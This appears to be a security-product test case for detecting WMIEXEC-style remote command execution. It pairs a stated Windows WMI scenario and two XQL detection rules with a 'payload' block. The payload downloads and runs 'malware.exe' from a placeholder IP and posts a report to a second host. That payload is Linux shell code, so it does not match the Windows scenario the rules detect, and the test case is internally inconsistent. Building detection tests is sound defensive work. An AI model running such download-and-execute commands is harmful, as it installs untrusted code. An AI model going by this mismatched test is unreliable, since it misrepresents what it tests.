identity.name: WMIEXEC-style Command Execution via WMI
identity.summary: An attacker uses WMI to execute a remote command, spawning cmd.exe under WmiPrvSE with output redirected to ADMIN$. Cortex should detect this behavior as a wmiexec-style command execution.
identity.description: An attacker uses WMI to execute a remote command, spawning cmd.exe under WmiPrvSE with output redirected to ADMIN$. Cortex should detect this behavior as a wmiexec-style command execution.

payload.code:
wget http://192.0.2.50/malware.exe -O /tmp/malware.exe
stub chmod +x /tmp/malware.exe
stub /tmp/malware.exe
stub curl -X POST http://192.0.2.100:8080/report -d 'status=executed'

biocs.name: WMI Command Execution
biocs.description: Detection of cmd.exe execution under WmiPrvSE process
biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter actor_process_image_name = 'WmiPrvSE.exe' and action_process_image_name = 'cmd.exe'

abiocs.name: Command Execution via WMI
abiocs.description: Behavioral deviation of cmd.exe process spawning under WmiPrvSE with ADMIN$ redirection
abiocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter actor_process_image_name = 'WmiPrvSE.exe' and action_process_image_name = 'cmd.exe'
| filter action_file_path contains 'ADMIN$'
